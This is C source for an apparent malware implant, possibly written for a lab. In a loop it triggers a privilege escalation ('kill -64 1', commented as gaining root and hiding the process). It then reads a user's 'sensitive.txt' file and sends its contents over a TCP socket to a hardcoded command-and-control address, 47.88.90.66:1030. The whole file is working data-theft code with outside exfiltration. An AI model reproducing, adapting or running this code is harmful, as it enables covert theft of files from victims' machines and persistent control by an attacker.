#include <stdlib.h>
#include <stdio.h>
#include <dirent.h> 
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#define PORT 1030

/*static void test_connection(void)
{
	char cmd[] = "curl -I https://stackoverflow.com/";
    system(cmd);
}*/

/* 
Establish stream TCP socket connection with Command & Control Server 
Source: https://www.geeksforgeeks.org/socket-programming-cc/
*/
int send_server(char *message)
{
   int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    char buffer[1024] = { 0 };
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
 
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
 
    // Convert IPv4 and IPv6 addresses from text to binary
    if (inet_pton(AF_INET, "47.88.90.66", &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
 
    if ((client_fd
         = connect(sock, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    send(sock, message, strlen(message), 0);
    printf("Data sent\n");
    valread = read(sock, buffer, 1024);
    printf("%s\n", buffer);
 
    // Close established socket
    close(client_fd);
    return 0;
}

int get_root(void)
{
    system("kill -64 1");
    
    // prove that root was gained
    //system("whoami > /home/debian/test.txt");

    // get pid to hide process
    int pid = getpid();
    //printf("pid is %d\n", pid);

    return 0;
}

/* Get sensitive file data
Source: https://www.geeksforgeeks.org/c-program-to-read-contents-of-whole-file/ */
int get_file_data() {

    // read file data into variable with absolute path    
    //char *file_path = sprintf("/home/%s/Documents/sensitive.txt", getenv("USERPROFILE"));
    FILE* ptr = fopen("/home/debian/Documents/sensitive.txt", "r");
    if (ptr == NULL) {
        printf("no such file.");
        return 0;
    }
 
    // Printing what is written in file
    // character by character using loop.
    char ch;
    do {
        ch = fgetc(ptr);
        printf("%c", ch);
        send_server(&ch);
 
        // Checking if character is not EOF.
        // If it is EOF stop reading.
    } while (ch != EOF);

    fclose(ptr);

    return 0;
}

int main(int argc, char *argv[]) 
{

    while(1)
    {
        //test_connection();
        get_root();
        get_file_data();
        sleep(10);
    }

    return 0;
}